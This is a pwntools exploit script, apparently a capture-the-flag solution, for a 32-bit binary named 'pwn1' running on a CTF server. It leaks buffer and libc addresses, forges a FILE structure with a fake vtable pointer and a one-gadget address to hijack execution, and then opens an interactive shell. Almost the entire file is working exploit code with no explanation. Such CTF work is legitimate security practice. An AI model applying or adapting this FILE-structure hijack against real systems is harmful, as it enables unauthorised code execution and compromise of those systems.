#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./pwn1 --host localhost --port 1337
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwn1')
context.terminal = ['tmux', 'splitw', '-h']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'ctf.cscml.zenysec.com'
port = int(args.PORT or 20005)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x565557D7
b *0x565558EB
continue
'''.format(**locals())
libc = ELF('./libc6_2.27-3ubuntu1_i386.so')
io = start(env={"LD_PRELOAD":"./libc6_2.27-3ubuntu1_i386.so"})
io.recvuntil('DEBUG[1]: ')
buffer = int(io.recvline().strip(), 16)
log.success('buffer @ {}'.format(hex(buffer)))
io.recvuntil('DEBUG[2]: ')
libc_leak = int(io.recvline().strip(), 16)
libc.address = libc_leak - libc.sym['malloc']
log.success('libc @ {}'.format(hex(libc.address)))
io.recvuntil('input?\n')
#https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
fake_file = b''
fake_file += p32(0) * 13
fake_file += p32(libc.address + 0x1d8ce0)
fake_file += p32(0)* 4
fake_file += p32(libc.symbols["__free_hook"]) # need to be pointing to a writable memroy area that can is 0
fake_file += p32(0) * 3
fake_file += p32(libc.symbols["__free_hook"])# need to be pointing to a writable memroy area that can is 0
fake_file += p32(0) * 14
fake_file += p32(libc.address + 0x1d6860 + 0x4c )#0x1e15e0 vtable offset
fake_file += p32(libc.address + 0x137e5e) #one gadget 
fake_file += p32(0) * 10


io.sendline(fit({0: fake_file,
                256: p32(buffer-0x108)}))
io.interactive()

